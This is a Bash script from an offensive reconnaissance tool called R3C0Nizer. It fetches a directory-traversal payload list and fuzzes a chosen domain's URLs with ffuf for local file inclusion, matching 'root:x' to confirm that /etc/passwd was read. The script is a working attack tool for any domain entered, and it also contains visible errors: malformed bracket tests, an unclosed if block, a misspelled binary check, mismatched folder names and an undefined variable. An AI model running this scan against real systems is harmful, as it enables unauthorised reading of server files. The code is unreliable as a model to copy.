#!/bin/bash

#colors
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
reset=`tput sgr0`

read -p "Enter domain name : " DOM

if [ -d ~/reconizer/ ]
then
  echo " "
else
  mkdir ~/reconizer
fi

if [ -d ~/reconizer/$DOM/vulnerabilities]
then
  echo " "
else
  mkdir ~/reconizer/$DOM/vulnerabilities
fi

if [ -d ~/reconizer/$DOM/vulnerabilities/lfi]
then
  echo " "
else
  mkdir ~/reconizer/$DOM/vulnerabilities/lfi
fi

echo "${red}
 =================================================
|   ____  _____  ____ ___  _   _ _                |
|  |  _ \|___ / / ___/ _ \| \ | (_)_______ _ __   |
|  | |_) | |_ \| |  | | | |  \| | |_  / _ \ '__|  |
|  |  _ < ___) | |__| |_| | |\  | |/ /  __/ |     |
|  |_| \_\____/ \____\___/|_| \_|_/___\___|_|     |
|                                                 |
 ================== Anon-Artist ==================
${reset}"
echo "${blue} [+] Started lfi Vulnerability Scanning ${reset}"
echo " "

#lfi
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo " "
if [[ ! -f ~/reconizer/$DOM/tools/dotdotpwn.txt ]]
then
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/dotdotpwn.txt 
cat dotdotpwn.txt | head -n 120 > ~/reconizer/$DOM/tools/lfipayloads.txt
if [ -f ~/go/bin/ffuz ]
then
echo -e ${CG}"\n[+] Searching For LFI Injection:- "
cat ~/reconizer/$DOM/GF_Patterns/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/reconizer/$DOM/tools/lfipayloads.txt -of csv -o ~/reconizer/$DOM/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
else
  echo "${blue} [+] Installing lfi ${reset}"
  go install github.com/ffuf/ffuf/v2@latest
echo -e ${CG}"\n[+] Searching For LFI Injection:- "
cat ~/reconizer/$DOM/GF_Patterns/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/reconizer/$DOM/tools/lfipayloads.txt -of csv -o ~/reconizer/$DOM/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
fi

echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo ""
echo "${blue} [+] Successfully saved the results"
echo ""
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
echo " "
echo "${red} [+] Thank you for using R3C0Nizer${reset}"
echo ""
echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
